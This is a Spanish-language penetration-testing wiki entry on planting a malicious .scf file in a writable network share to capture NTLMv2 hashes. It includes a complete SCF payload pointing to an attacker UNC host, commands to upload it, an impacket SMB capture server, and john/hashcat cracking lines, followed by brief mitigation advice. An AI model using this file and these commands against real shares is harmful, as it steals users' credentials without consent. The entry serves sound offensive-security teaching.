---
title: Archivo SCF malicioso
resumen: Envenenar el icono de un archivo en un share para capturar el hash NTLMv2 de quien lo visualice.
tags: smb-tools, hashcat-john
---

## Definición

Los ficheros `.scf` (Shell Command File) definen, entre otras cosas, un icono personalizado. Si ese icono apunta a una ruta UNC remota (`\\IP\share\icono.ico`), el explorador de Windows intentará cargarlo en cuanto el usuario **abra la carpeta que lo contiene**, sin necesidad de hacer doble clic sobre el archivo. Esa petición de icono es una autenticación SMB más, y por tanto filtra el hash NTLMv2 de quien la realiza — normalmente basta con que el administrador liste el share.

## Cuándo se usa

Cuando se tiene capacidad de escritura sobre un recurso compartido de red (por permisos propios o abusando de una mala configuración) y se quiere capturar el hash de otro usuario, típicamente uno con más privilegios, sin ninguna interacción activa por su parte más allá de abrir la carpeta.

## Requisitos previos

- Permisos de escritura sobre un share al que la víctima (idealmente un administrador) tenga acceso de lectura.
- Un servidor SMB propio (o el mismo share) preparado para recibir la autenticación resultante.

## Desarrollo del ataque

1. Confirmar que se tiene permiso de escritura sobre el share objetivo.
2. Preparar el fichero `.scf` apuntando a un recurso UNC controlado por el atacante.
3. Subir el fichero al share.
4. Levantar un servidor SMB propio (o usar Responder) para capturar la autenticación cuando la víctima liste la carpeta.
5. Crackear el hash NTLMv2 capturado offline.

```ini
[Shell]
Command=2
IconFile=\\IP_ATACANTE\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# Subir el archivo al share (desde smbclient, tras conectar)
put archivo.scf

# Levantar el recurso compartido propio que recibirá la autenticación
impacket-smbserver share $(pwd) -smb2support

# Crackeo del hash capturado
john --wordlist=wordlist.txt hash-capturado
hashcat -m 5600 -a 0 hash-capturado wordlist.txt
```

## Herramientas relacionadas

- Ver [[smb-tools]] (smbclient para subir el archivo)
- Ver [[hashcat-john]]

## Detección y mitigación

Restringir permisos de escritura en shares compartidos al mínimo imprescindible, deshabilitar la firma automática de iconos remotos vía política de restricción de rutas UNC, y monitorizar autenticaciones SMB salientes desde cuentas administrativas hacia recursos no habituales.
